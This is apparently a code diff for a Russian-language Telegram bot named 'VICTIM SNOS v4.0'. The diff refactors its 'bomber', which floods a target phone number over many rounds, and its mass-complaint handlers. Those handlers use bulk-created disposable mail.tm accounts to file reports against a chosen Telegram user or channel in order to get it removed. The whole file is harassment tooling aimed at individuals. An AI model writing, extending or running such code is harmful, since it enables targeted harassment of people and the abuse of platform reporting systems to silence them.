 async def bomber_process_count(message: types.Message, state: FSMContext):
@@ -836,11 +827,10 @@ async def bomber_process_count(message: types.Message, state: FSMContext):
     
     data = await state.get_data()
     phone = data["phone"]
-    username = f"{message.from_user.id}"
     
     await state.clear()
     
-    status_msg = await message.answer(f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nСайтов: {len(BOMBER_WEBSITES)}\nРаундов: {count}")
+    status_msg = await message.answer(f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}")
     
     async def update_progress(current, total, successful, failed):
         try:
@@ -854,8 +844,8 @@ async def bomber_process_count(message: types.Message, state: FSMContext):
         except:
             pass
     
-    results, successful, failed = await bomber_attack(phone, count, update_progress)
-    report = generate_bomber_report(username, phone, results, successful, failed)
+    results, successful, failed = await bomber_only_attack(phone, count, update_progress)
+    report = generate_report(phone, results, successful, failed, "BOMBER")
     
     filename = f"bomber_{phone.replace('+', '')}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
@@ -863,102 +853,78 @@ async def bomber_process_count(message: types.Message, state: FSMContext):
     
     await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
     os.remove(filename)
-    
     await status_msg.delete()
-    await message.answer("<b>Главное меню</b>", reply_markup=get_main_menu())
-
-@dp.callback_query(F.data == "complaint_account")
-async def complaint_account(callback: types.CallbackQuery, state: FSMContext):
-    if not mail_tm.ready or not mail_tm.accounts:
-        await callback.answer("Почта еще загружается!", show_alert=True)
-        return
     
-    await state.set_state(ComplaintState.waiting_username)
-    await callback.message.edit_text(
-        "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
-        ])
-    )
-    await callback.answer()
+    caption = "<b>Главное меню</b>"
+    await send_banner_with_caption(message, caption, get_main_menu())
 
-@dp.callback_query(F.data == "complaint_channel")
-async def complaint_channel(callback: types.CallbackQuery, state: FSMContext):
-    if not mail_tm.ready or not mail_tm.accounts:
-        await callback.answer("Почта еще загружается!", show_alert=True)
-        return
-    
-    await state.set_state(ComplaintState.waiting_channel)
-    await callback.message.edit_text(
-        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
-        ])
-    )
-    await callback.answer()
 
-@dp.message(StateFilter(ComplaintState.waiting_username))
+@dp.message(StateFilter(ComplaintAccountState.waiting_username))
 async def process_complaint_username(message: types.Message, state: FSMContext):
     username = message.text.strip().replace("@", "")
     await state.clear()
     
     status_msg = await message.answer("<b>Отправка жалоб...</b>")
     sent = await send_mass_complaint_account(mail_tm, username)
-    
     await status_msg.delete()
-    await message.answer(
-        f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nОтправлено писем: {sent}",
-        reply_markup=get_main_menu()
-    )
+    
+    await message.answer(f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nОтправлено: {sent} писем")
+    
+    caption = "<b>Главное меню</b>"
+    await send_banner_with_caption(message, caption, get_main_menu())
 
-@dp.message(StateFilter(ComplaintState.waiting_channel))
+
+@dp.message(StateFilter(ComplaintChannelState.waiting_channel))
 async def process_complaint_channel(message: types.Message, state: FSMContext):
     channel = message.text.strip()
     await state.clear()
     
     status_msg = await message.answer("<b>Отправка жалоб...</b>")
     sent = await send_mass_complaint_channel(mail_tm, channel)
-    
     await status_msg.delete()
-    await message.answer(
-        f"<b>ГОТОВО!</b>\n\nКанал: {channel}\nОтправлено писем: {sent}",
-        reply_markup=get_main_menu()
-    )
+    
+    await message.answer(f"<b>ГОТОВО!</b>\n\nКанал: {channel}\nОтправлено: {sent} писем")
+    
+    caption = "<b>Главное меню</b>"
+    await send_banner_with_caption(message, caption, get_main_menu())
+
 
 @dp.callback_query(F.data == "stop_attack")
 async def stop_attack(callback: types.CallbackQuery):
-    await callback.message.edit_text("<b>Остановлено</b>", reply_markup=get_main_menu())
+    await edit_to_banner(callback, "<b>Остановлено</b>", get_main_menu())
     await callback.answer()
+
 
 # ---------- ЗАПУСК ----------
 mail_tm = MailTM()
 
+
 async def init_mailtm_background():
-    """Фоновая инициализация mail.tm"""
     try:
-        with open('mailtm_accounts.json', 'r') as f:
+        with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
             mail_tm.accounts = json.load(f)
             mail_tm.ready = True
-            logger.info(f"Загружено {len(mail_tm.accounts)} mail.tm аккаунтов из файла")
+            logger.info(f"Loaded {len(mail_tm.accounts)} mail.tm accounts")
     except:
-        logger.info("Создание новых mail.tm аккаунтов...")
+        logger.info("Creating new mail.tm accounts...")
         await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
         if mail_tm.accounts:
-            with open('mailtm_accounts.json', 'w') as f:
+            with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                 json.dump(mail_tm.accounts, f)
 
+
 async def main():
-    logger.info("VICTIM SNOS v3.0 запуск...")
+    logger.info("VICTIM SNOS v4.0 starting...")
     
     await bot.delete_webhook(drop_pending_updates=True)
     
-    # Запускаем фоновые задачи
+    # Фоновые задачи
     asyncio.create_task(init_sessions_background())
     asyncio.create_task(init_mailtm_background())
     
-    logger.info("Бот запущен!")
-    
+    logger.info("Bot started!")
     await dp.start_polling(bot)
+
 
 if __name__ == "__main__":
     asyncio.run(main())
